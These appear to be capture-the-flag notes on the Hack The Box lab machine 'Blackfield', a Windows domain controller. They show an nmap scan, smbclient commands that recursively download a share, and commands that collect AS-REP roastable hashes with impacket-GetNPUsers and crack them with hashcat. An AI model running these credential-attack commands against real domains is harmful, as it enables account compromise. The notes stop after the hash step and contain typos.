# Blackfield

## NMAP

``` text
10.129.229.17:53
10.129.229.17:88
10.129.229.17:139
10.129.229.17:135
10.129.229.17:389
10.129.229.17:389
10.129.229.17:445
10.129.229.17:445
10.129.229.17:593
10.129.229.17:3268
10.129.229.17:5985

PORT STATE SERVICE REASON VERSION

53/tcp open domain syn-ack ttl 127 Simple DNS Plus
88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-09 16:52:08Z)
135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
139/tcp filtered netbios-ssn no-response
389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp open microsoft-ds? syn-ack ttl 127
593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp filtered ldapssl no-response
3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
3269/tcp filtered globalcatLDAPssl no-response
5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp filtered adws no-response
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## SMB

![smb-shares](/HTB/Machines/images/Blackfield-smb-shares.png)

we can get usernames via profles$ share and use it with ASREP Roasting

``` bash
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *
```

```bash
impacket-GetNPUsers BLACKFIELD.local/ -usersfile user.txt -format hashcat -outputfile hashes.asreproast

hashcat -m 18200 --force -a 0 hashes.asreproast /user/share/worldists/rockyou.txt
```
![GetNPUsers](/HTB/Machines/images/Blackfield-GetNPUsers.png)